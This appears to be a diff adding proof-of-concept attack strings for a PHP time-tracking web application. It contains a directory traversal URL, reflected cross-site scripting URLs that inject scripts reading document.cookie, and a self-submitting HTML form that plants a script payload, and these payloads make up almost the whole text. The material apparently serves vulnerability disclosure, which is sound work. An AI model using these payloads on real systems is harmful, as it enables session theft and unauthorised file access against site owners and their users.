@@ -1,0 +1,21 @@
+Directory Traversal:
+
+http://www.example.com/thumb.php?pic=./../../../../../tmp/photo.jpg
+
+Cross-site Scripting:
+
+http://www.example.com/managetimetracker.php?action=editform&amp;tid=1&amp;id=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/manageuser.php?action=profile&amp;id=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+
+HTML-injection:
+
+&lt;form action=&quot;http://www.example.com/manageproject.php?action=edit&amp;id=1&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&#039;test&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;desc&quot; value=&quot;Description&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;end&quot; value=&quot;16.03.2011&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
